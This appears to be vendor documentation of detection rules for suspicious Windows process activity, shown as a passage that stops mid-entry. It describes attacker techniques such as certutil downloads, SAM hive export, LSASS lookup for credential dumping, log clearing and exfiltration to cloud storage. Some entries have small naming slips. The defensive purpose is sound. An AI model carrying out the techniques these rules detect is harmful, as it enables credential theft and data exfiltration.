---
title: "Windows Suspicious Process"
slug: "windows-suspicious-process"
hidden: false
excerpt: "Threat detection rules associated with Windows Suspicious Process."
---

These detections identify suspicious activity from process start records collected by the Insight Agent from Windows endpoints.

<details>
<summary>Attacker - Extraction Of 7zip Archive With Password</summary>



#### Description

This detection identifies the use of the ‘7za.exe’ compression utility to extract contents from an encrypted archive using a password. This technique is used by malicious actors to deliver encrypted binaries to the endpoint prior to execution.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Attacker Technique - Accessibility Tool Launching CMD or PowerShell</summary>



#### Description

This detection identifies ‘cmd.exe’ or ‘powershell.exe’ being launched by various accessibility tools, such as ‘sethc.exe’, ‘utilman.exe’, ‘magnify.exe’, ‘osk.exe’, and ‘narrator.exe’. These accessibility tools are replaced by malicious actors with other known, good binaries so they can be used to gain access to systems without authenticating.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Event Triggered Execution - T1546
- Accessibility Features - T1546.008


</details>



<details>
<summary>Attacker Technique - Accessibility Tool Launching Process</summary>



#### Description

This detection identifies binaries being launched by various accessibility tools, such as ‘sethc.exe’, ‘utilman.exe’, ‘magnify.exe’, ‘osk.exe’, and ‘narrator.exe’. These accessibility tools are replaced by malicious actors with other known, good binaries so they can be used to gain access to systems without authenticating. 

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Event Triggered Execution - T1546
- Accessibility Features - T1546.008


</details>



<details>
<summary>Attacker Technique - Add Domain Or Enterprise Admin With Net</summary>



#### Description

This detection identifies the ‘net.exe’ or ‘net1.exe’ command with arguments being passed to it to add a user to the ‘Domain Admins’ or ‘Enterprise Admins’ group. This technique is used by malicious actors and penetration testers to escalate the privileges of the target account.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password. Additionally, review the users in privileged groups within Active Directory and remove unexpected or unknown members.

#### MITRE ATT&CK Techniques

- Create Account - T1136
- Domain Account - T1136.002


</details>



<details>
<summary>Attacker Technique - AppLocker Bypass Via SCT Code Execution</summary>



#### Description

This detection identifies ‘advpack.dll’ being used to load a crafted ‘.inf’ script containing instructions to execute a remote ‘.sct’ file. This technique is used by malicious actors to bypass Microsoft AppLocker.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218
- Rundll32 - T1218.011


</details>



<details>
<summary>Attacker Technique - Array Reverse Obfuscation Passed To PowerShell</summary>



#### Description

This detection identifies the string ‘[Array]::Reverse’ being passed to ‘PowerShell.exe’ in various obfuscated forms. This technique is used by malicious actors to obfuscate the script being passed to ‘PowerShell.exe’ which bypasses some types of simple blocks or detections that may fire on the contents of the script.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Deobfuscate/Decode Files or Information - T1140


</details>



<details>
<summary>Attacker Technique - Assign Mailbox To Another User With PowerShell</summary>



#### Description

This detection identifies the cmdlet 'Get-ManagementRoleAssignment' being passed to 'PowerShell.exe' through the command line. This technique is used by malicious actors to obtain access to privileged user mailboxes for exfiltration.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Exchange Email Delegate Permissions - T1098.002


</details>



<details>
<summary>Attacker Technique - Attrib Sets File Or Directory As Hidden And System</summary>



#### Description

This detection identifies the ‘Attrib.exe’ utility being used to set a file as hidden and transferring ownership of the file to the System user. 

#### Recommendation

 Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Hide Artifacts - T1564
- Hidden Files and Directories - T1564.001


</details>



<details>
<summary>Attacker Technique - Batch File Executing Powershell To Spawn Python.exe</summary>



#### Description

This detection identifies a Windows Batch file that executes a Powershell command to spawn "Python.exe". Malicious actors use this technique to execute malicious python scripts.

#### Recommendation

Investigate the command that is being scheduled to run. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Windows Command Shell - T1059.003
- Python - T1059.006


</details>



<details>
<summary>Attacker Technique - Bazarloader Injected In MS Edge To Spawn Net Command</summary>



#### Description

This detection identifies execution of 'msedge.exe' spawning 'net.exe' or 'net1.exe' command. The technique is used by malicious actors, in particular the Bazarloader malware, to inject into the Edge browser process and before spawning net commands.

#### Recommendation

Examine the parent process that spawned the process in question. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055
- Exploitation for Defense Evasion - T1211


</details>



<details>
<summary>Attacker Technique - Binary Executed from Windows\Temp\Sys</summary>



#### Description

This detection identifies binaries from the ‘windows\temp\sys’ directory being executed. This directory is used by malicious actors to store tools and malware that can be used against a target during a compromise.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Match Legitimate Name or Location - T1036.005


</details>



<details>
<summary>Attacker Technique - Blacklist User Accounts</summary>



#### Description

This detection identifies command line activity associated with blacklisted user accounts that Rapid7 has observed during past and/or present campaigns. Some techniques used by malicious actors include common account name reuse. Malicious actors could use the account name and/or password across multiple intrusions.


#### Recommendation

Investigate the activity to determine if the process events are authorized and expected within the environment. If the process events are not, lock the account executing the processes in question.

#### MITRE ATT&CK Techniques

- Create Account - T1136
- Domain Account - T1136.002


</details>



<details>
<summary>Attacker Technique - Blue Mockingbird Service Execution</summary>



#### Description

This detection identifies the modification and execution of existing service 'wercplsupport' to execute a malicious DLL, a behavior identified in the Blue Mockingbird malware. Blue Mockingbird is known to persist by leveraging Windows services, and deploys a Monero cryptominer. It can also masquerade an XMRig payload with file 'wersupporte.dll' as a legitimate 'wersupport.dll' file.

#### Recommendation

Investigate the DLL file that is being executed. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Windows Service - T1543.003
- System Services - T1569
- Service Execution - T1569.002


</details>



<details>
<summary>Attacker Technique - CertUtil With Decode Flag</summary>



#### Description

This detection identifies the use of the ‘certutil.exe’ binary with the ‘-decode’ flag being passed to it. This technique is used by malicious actors to decode files that were encoded in the Base64 format.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Deobfuscate/Decode Files or Information - T1140


</details>



<details>
<summary>Attacker Technique - CertUtil With URLCache Flag</summary>



#### Description

This detection identifies the use of the ‘certutil.exe’ binary with the ‘-urlcache’ flag being passed to it. This technique is used by malicious actors to retrieve files hosted on a remote web server and write them to disk.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Deobfuscate/Decode Files or Information - T1140


</details>



<details>
<summary>Attacker Technique - Clearing Event Logs With WEvtUtil</summary>



#### Description

This detection identifies the use of the ‘WvUtil.exe’ to clear Windows event logs with the ‘cl’ flag. This technique is used by malicious actors and ransomware, such as Petya, to destroy logs used by investigators.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Clear Windows Event Logs - T1070.001


</details>



<details>
<summary>Attacker Technique - Cmd Executing Binary From Recycle Bin</summary>



#### Description

This detection identifies 'cmd.exe' attempting to execute '.exe' files from within a recycle bin. This technique is used by malicious actors as a method of hiding the location of their staging directory.

#### Recommendation

Review the process activity on the host to identify other suspicious behavior. Retrieve the binary in question and perform analysis on its behavior if the hash is unknown. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Hide Artifacts - T1564
- Hidden Files and Directories - T1564.001


</details>



<details>
<summary>Attacker Technique - Cmdkey Cached Credentials Recon</summary>



#### Description

This detection identifies ‘cmdkey.exe’ being executed with the ‘/list’ flag. This technique is used by malicious actors to list any cached credentials on a system, which can potentially be used for privilege escalation.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Unsecured Credentials - T1552


</details>



<details>
<summary>Attacker Technique - CMD Starts a URL</summary>



#### Description

This detection identifies the 'start' command being used on a URL in 'cmd.exe'. Malicious actors use this command to access malicious infrastructure.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. Investigate the accessed site and whether it serves a business use. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Windows Command Shell - T1059.003


</details>



<details>
<summary>Attacker Technique - CMSTP UAC Bypass via COM Object Access</summary>



#### Description

This detection identifies ‘CMSTP.exe’ being used to bypass UAC. There is also a secondary attack method, which usesDLLs to interface directly with COM objects, rather than using ‘CMSTP.exe’. If this attack vector is successfully executed, it will result in an elevated process running under the parent process, ‘DllHost.exe’.


#### Recommendation

Investigate the child process of ‘DllHost.exe’. Malicious activity may be evident, and may be a shell, such as ‘cmd.exe’ or ‘powershell.exe’, or it may be a newly created binary on the system.

#### MITRE ATT&CK Techniques

- CMSTP - T1218.003


</details>



<details>
<summary>Attacker Technique - Command Execution Via ScreenConnect</summary>



#### Description

This detection identifies child processes of the ScreenConnect Client to identify commands executed by malicious actors. ScreenConnect is a legitimate remote access tool used by malicious actors to maintain persistence in a target environment. 

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Remote Access Software - T1219


</details>



<details>
<summary>Attacker Technique - Compressing Mailbox With 7zip</summary>



#### Description

This detection identifies the use of the archiving tool known as 7zip being used to create an archive containing a users mailbox. This technique is used by malicious actors in order to compress and stage data for later exfiltration.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Data Staged - T1074
- Local Data Staging - T1074.001
- Archive Collected Data - T1560
- Archive via Utility - T1560.001


</details>



<details>
<summary>Attacker Technique - Create Account With WMIC or NET</summary>



#### Description

This detection identifies a process event for the Windows binaries ’net.exe’ or ’wmic.exe’ containing the ‘/add’ and ‘node’ command line switches.

#### Recommendation

Investigate the process execution history on the host in question to determine if the account creation is authorized and expected within the client network. If necessary, delete the created user account and reset the password of the user that performed the action.

#### MITRE ATT&CK Techniques

- Create Account - T1136
- Local Account - T1136.001
- Domain Account - T1136.002


</details>



<details>
<summary>Attacker Technique - Creating A Scheduled Task Triggered By A Windows Event ID</summary>



#### Description

This detection identifies ‘schtasks.exe’ being used to create a scheduled task, that is triggered by an event with a specified Event ID, to run an executable file. Malicious actors use this technique as another way to execute payloads to possibly avoid early detection on the system.

#### Recommendation

Investigate the command that is being scheduled to run. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Scheduled Task/Job - T1053
- Exploitation for Defense Evasion - T1211


</details>



<details>
<summary>Attacker Technique - Curl or WGet Request To Pastebin</summary>



#### Description

This detection identifies ‘wget’ or ‘curl’ making requests to the ‘pastebin.com’ domain. This technique is used by malicious actors to retrieve malicious scripts after compromising a target host.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Web Service - T1102


</details>



<details>
<summary>Attacker Technique - Data Exfiltration To Box.com</summary>



#### Description

This detection identifies various utilities uploading data to Box.com’s hosts, ‘upload.box.com’ and ‘api.box.com’. This technique is used by malicious actors to exfiltrate data from a target to this particular cloud storage provider.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Exfiltration Over Web Service - T1567
- Exfiltration to Cloud Storage - T1567.002


</details>



<details>
<summary>Attacker Technique - Delete Windows Defender Directory</summary>



#### Description

This detection identifies the defense evasion technique of deleting all files and folders associated with the Windows Defender application.

#### Recommendation

Investigate the process execution history on the host in question to determine the root cause of this execution. If malware is identified during the investigation process, isolate the system and restore it from a validated known, good baseline image.

#### MITRE ATT&CK Techniques

- Impair Defenses - T1562
- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Attacker Technique - Deleting Terminal Server Client\Default Key With Reg</summary>



#### Description

This detection identifies ‘Reg.exe’ being used to delete the registry key HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default. This key contains a history of RDP connections made from the client, and malicious actors may attempt to delete this key to hide their activity. 

#### Recommendation

Determine whether the user deleting the key had a legitimate reason for doing so. Investigate any RDP activity to or from the host in the timeframe prior to the command being run. The source or destination hosts from any RDP activity should also be investigated for any signs of suspicious activity. 

#### MITRE ATT&CK Techniques

- Modify Registry - T1112


</details>



<details>
<summary>Attacker Technique -  Determining External IP Via Command Line</summary>



#### Description

This detection identifies the use of various services that display the source IP address a request originates from. This technique is used by malicious actors to identify the source IP address of an endpoint, which provides geographic location and network owner information.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- System Information Discovery - T1082


</details>



<details>
<summary>Attacker Technique - Dir Search for Files containing the "ssh" string</summary>



#### Description

This detection identifies the technique of using the Windows command "dir" in searching for files containing the string "ssh" in their filenames. This has been observed in use by malicious actors, to exfiltrate SSH credentials that can be possibly used for further attacks on the system.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

</details>



<details>
<summary>Attacker Technique - Disable Sysmon</summary>



#### Description

This detection identifies unloading or disabling of Sysmon Driver. Malicious actors have been observed disabling Sysmon to prevent it from reporting indicators related to their activity.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Attacker Technique - DLL executing MSRA Process</summary>



#### Description

This detection identifies the execution of a legitimate "msra.exe", Microsoft Remote Assistance process. This process is spawned as a result of process injection by a DLL using "regsvr32.exe" or "rundll32.exe" as its parent process. The activity was observed in Qbot infection.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055
- Regsvr32 - T1218.010
- Rundll32 - T1218.011


</details>



<details>
<summary>Attacker Technique - DLL Spawns Mobsync</summary>



#### Description

This detection identifies the execution of a suspicious DLL to inject into process mobsync.exe. Malicious actors have been observed with this activity to perform process injection consistent with the QBot malware family.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055


</details>



<details>
<summary>Attacker Technique - Domain Discovery With ADFind </summary>



#### Description

This detection identifies the use of the utility ‘adfind.exe’, specifically the process arguments for domain/trust enumeration, and remote system discovery. Rapid7 has observed malicious actors using this legitimate software utility to perform reconnaissance against a target’s Active Directory Domain. A malicious actor could redirect the output of this utility to a file.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Account Discovery - T1087
- Domain Account - T1087.002


</details>



<details>
<summary>Attacker Technique - Download and Execute Passed To PowerShell</summary>



#### Description

This detection identifies the use of specific methods to download and execute a file hosted on a remote server being passed to 'PowerShell.exe'. This technique is used by malicious actors to retrieve and execute malware on a target’s endpoint, through the use of macros embedded within malicious documents.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Attacker Technique - Download And Execute With Background Intelligent Transfer Service</summary>



#### Description

This detection identifies the use of the Background Intelligent Transfer Service (BITS), ‘bitsadmin.exe’, to retrieve and execute a file. This technique is used by malicious actors with malicious documents to drop and execute payloads on the target’s endpoint.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- BITS Jobs - T1197
- User Execution - T1204
- Malicious File - T1204.002
- Phishing - T1566
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Attacker Technique - DSQuery Enumerating Servers</summary>



#### Description

This detection identifies the dsquery utility being used to enumerate servers using the operatingSystem=*server* argument. Malicious actors may do this to identify targets for lateral movement. 

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Remote System Discovery - T1018


</details>



<details>
<summary>Attacker Technique - DWWin Executed From AppData\Roaming</summary>



#### Description

This detection identifies ‘dwwin.exe’ being executed from a users ‘AppData\Roaming’ directory. This technique is used by malicious actors to execute older versions of this binary that are vulnerable to ‘.dll’ side loading techniques.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- DLL Side-Loading - T1574.002


</details>



<details>
<summary>Attacker Technique - Enable Null Cipher Using Reg</summary>



#### Description

This detection identifies the '\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers\NULL' key being passed to 'reg.exe' to enable the NULL cipher on the system, which can allow data transmission in cleartext. This technique is used by malicious actors to remove the protection provided by SSL encryption, which makes the network communications vulnerable to eavesdropping and Man-in-the-Middle attacks.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Modify Registry - T1112


</details>



<details>
<summary>Attacker Technique - Encrypting Mailbox With WinRar</summary>



#### Description

This detection identifies WinRar being used to create a password protected archive containing a user's mailbox. This technique is used by malicious actors to compress and stage data for later exfiltration.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Data Staged - T1074
- Local Data Staging - T1074.001
- Archive Collected Data - T1560
- Archive via Utility - T1560.001


</details>



<details>
<summary>Attacker Technique - Enumerating Domain Or Enterprise Admins With Net Command</summary>



#### Description

This detection identifies the use of the ‘net.exe’ or ‘net1.exe’ command to enumerate users that are members of the ‘Domain Admins’ or ‘Enterprise Admins’ groups. This technique is used by malicious actors and penetration testers to identify which accounts have the highest level of privilege in a domain.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Account Discovery - T1087
- Domain Account - T1087.002


</details>



<details>
<summary>Attacker Technique - Enumeration of Domain Users With Net</summary>



#### Description

This detection identifies the ‘net.exe’ command being used to enumerate members of the Domain Users group. Penetration testers and malicious actors use this technique to collect additional account information from a target, post compromise. This detection may also result from standard activity from system administrators or power users.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Account Discovery - T1087
- Domain Account - T1087.002


</details>



<details>
<summary>Attacker Technique - Execution From System32 With Directory Traversal</summary>



#### Description

This detection identifies the execution of binaries from the 'windows\system32' directory where the command line contains a subdirectory followed by directory traversal using '..\'. This technique is used by attackers in an attempt to bypass detections looking for specific paths to standard Windows binaries. 

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

</details>



<details>
<summary>Attacker Technique - Exfiltration Of Data To Cloud Storage With Rclone</summary>



#### Description

This detection identifies RClone being used on Windows. This is a backup utility that has been observed in use by malicious actors to exfiltrate data. 

#### Recommendation

Determine whether this usage of RSync is normal authorized activity. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Exfiltration to Cloud Storage - T1567.002


</details>



<details>
<summary>Attacker Technique - Exfiltration Of Data To Dropbox</summary>



#### Description

This detection identifies the use of ‘dropboxapi.com’ in a system’s command line. This technique is used by malicious actors performing exfiltration with programs, such as cURL, and when passing URLs to programs that cause uploads to Dropbox’s APIs.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Exfiltration Over Web Service - T1567
- Exfiltration to Cloud Storage - T1567.002


</details>



<details>
<summary>Attacker Technique - Exfiltration To Google Drive</summary>



#### Description

This detection identifies the use of ‘www.googleapis.com’ in a system’s command line. This technique is used by malicious actors performing exfiltration with programs, such as ‘curl.exe’, and when passing URLs to programs that cause uploads to Google’s APIs.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Exfiltration Over Web Service - T1567
- Exfiltration to Cloud Storage - T1567.002


</details>



<details>
<summary>Attacker Technique - Export SAM or SECURITY Registry Hive With Reg.exe</summary>



#### Description

This detection identifies the export of the 'SECURITY' or 'SAM' registry hives through the 'reg.exe' binary. This technique is used by malicious actors and penetration testers to obtain hashes or credentials stored in the Windows registry.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- Security Account Manager - T1003.002


</details>



<details>
<summary>Attacker Technique - File Download and Execution Using AppInstaller</summary>



#### Description

This detection identifies the use of 'AppInstaller.exe' to download and execute an arbitrary executable. This technique is used by malicious actors in order to proxy the execution of malicious code hosted on a remote system.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105
- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Attacker Technique - Find Admin SID Using Find or Findstr Commands</summary>



#### Description

This detection identifies the SID assigned to the default Windows Administrator account, ‘S-1-16-12288’, being passed to ‘find.exe’ or ‘findstr.exe’. This technique is used by malicious actors and penetration testers to identify if they are executing processes with local Administrator privileges.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Process Discovery - T1057


</details>



<details>
<summary>Attacker Technique: Find LSASS Process</summary>



#### Description

Malicious actors will often try to dump the contents of the LSASS process memory in an attempt to access credentials. To do so, they will have to locate the PID of the process. Often this will be done using built-in command line tools such as the findstr utility or PowerShell's Get-Process.

#### Recommendation

Determine if this was authorized testing or is activity related to a security tool. Otherwise, there is little to no reason for this activity to be occurring, and the host should be quarantined and investigated immediately.

#### MITRE ATT&CK Techniques

- LSASS Memory - T1003.001


</details>



<details>
<summary>Attacker Technique - Find RegASM</summary>



#### Description

This detection identifies ‘find.exe’ being used to locate the binary ‘regasm.exe’. alicious actors use this technique to proxy code execution through the Assembly Registration Tool that comes with the Microsoft .NET Framework. This is also commonly used by malicious actors with tools, such as Mimikatz to retrieve passwords from memory.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- LSASS Memory - T1003.001


</details>



<details>
<summary>Attacker Technique - FSUtil Enables Remote Symbolic Links on Windows </summary>



#### Description

This detection identifies FSUtil being used to enable Windows to recognize symbolic links.  This has been observed in the BlackCat/Noberus Ransomware  as a way to follow "Shortcut" files that are pointing to a remote location in the network to perform encryption.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Data Encrypted for Impact - T1486


</details>



<details>
<summary>Attacker Technique - Grant Everyone All Permissions On Network Share With Net</summary>



#### Description

This detection identifies the ‘net.exe’ command being used to create network shares that grant everyone all permissions . This technique is used by penetration testers and malicious actors to transport data to a staging location for review and possible exfiltration.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Windows File and Directory Permissions Modification - T1222.001


</details>



<details>
<summary>Attacker Technique - Hash Dumping With NTDSUtil</summary>



#### Description

This detection identifies the execution of 'NTDSUtil.exe', which is the command utility used when working with the 'NTDS.dit' Active Directory database and the enabled IFM set creation for DCPromo. The Install From Media (IFM) set is a copy of the 'NTDS.dit', and if it is not properly secured or configured, a malicious actor could use the snapshot taken during this process to extract credential data.

#### Recommendation

Investigate the parent process and process activity to determine if the activity is authorized and expected within the environment. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- NTDS - T1003.003


</details>



<details>
<summary>Attacker Technique - HermeticWiper observed</summary>



#### Description

This detection identifies the execution of a binary associated with HermaticaWiper observed in Russian campaigns against Ukraine.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Bootkit - T1542.003
- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Attacker Technique - Hiding ScreenConnect With Attrib</summary>



#### Description

This detection identifies the use of the 'attrib.exe' binary being executed with the '+h' flag being passed in order to hide the installation of the ScreenConnect client. This technique is used by malicious actors in order to hide the directory of the remote administration tool they have installed. 

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Hide Artifacts - T1564
- Hidden Files and Directories - T1564.001


</details>



<details>
<summary>Attacker Technique - Identifying LSASS Process Using FindStr</summary>



#### Description

This detection identifies ‘FindStr.exe’ looking for the value ‘LSASS’. This technique is used by malicious actors and penetration testers to identify which Process ID (PID) belongs to ‘LSASS.exe’ prior to retrieving the memory from that process for credential dumping.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

</details>



<details>
<summary>Attacker Technique - Imposter Windows Binary Executed From Non-Standard Directory</summary>



#### Description

This detection identifies specific Windows binary names being executed from non-standard locations. This technique is used by malicious actors to attempt to mask the execution of malware by naming the file the same thing as default Windows binaries.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Attacker Technique - InstallUtil Running Executable</summary>



#### Description

This detection identifies processes being loaded by Microsoft .NET's ‘InstallUtil.exe’ with output being redirected to a file and disabling output to the console. This technique is used by malicious actors to proxy the execution of malicious programs through known, good binaries.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- InstallUtil - T1218.004


</details>



<details>
<summary>Attacker Technique - InstallUtil Running Remotely Hosted Executable</summary>



#### Description

This detection identifies processes being loaded by Microsoft .NET's ‘InstallUtil.exe’ from a remote location specified in the ‘/UpdateServer’ flag. This technique is used by malicious actors to proxy the execution of remotely hosted malicious programs through known, good binaries.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- InstallUtil - T1218.004


</details>



<details>
<summary>Attacker Technique - InstallUtil Spawns Process</summary>



#### Description

This detection identifies 'InstallUtil.exe' spawning abnormal processes. This technique is used by malicious actors and penetration testers to perform proxy execution of another binary.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218
- InstallUtil - T1218.004


</details>



<details>
<summary>Attacker Technique - Invisible Service</summary>



#### Description

This detection identifies the use of tools, such as ‘sc.exe’, to create a service named to prevent it from being displayed. By default, a service with a ‘=’ character in the name will not be displayed by various Windows utilities.

#### Recommendation

Review the service in question. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Create or Modify System Process - T1543
- Windows Service - T1543.003
- Hide Artifacts - T1564


</details>



<details>
<summary>Attacker Technique - Known Utilities Executed From ProgramData</summary>



#### Description

This detection identifies known, specific file names from the ‘ProgramFiles’ directory being executed. This technique is used by malicious actors after placing their tools in this staging directory.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Local Data Staging - T1074.001
- Obtain Capabilities - T1588


</details>



<details>
<summary>Attacker Technique - .LNK spawns MSIExec to load remote HTTP object</summary>



#### Description

This detection identifies .lnk pointing to msiexec.exe to download and execute remote malware.

#### Recommendation

Investigate the URL that MSIExec is connecting to. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Shortcut Modification - T1547.009


</details>



<details>
<summary>Attacker Technique - Log Deletion Utility</summary>



#### Description

This detection identifies the use of a custom Windows event log detection utility by a malicious actor to delete ranges of the event logs on a local system. Malicious actors could delete event logs to obstruct an investigation of their activities or to enable them to go undetected in the network.

#### Recommendation

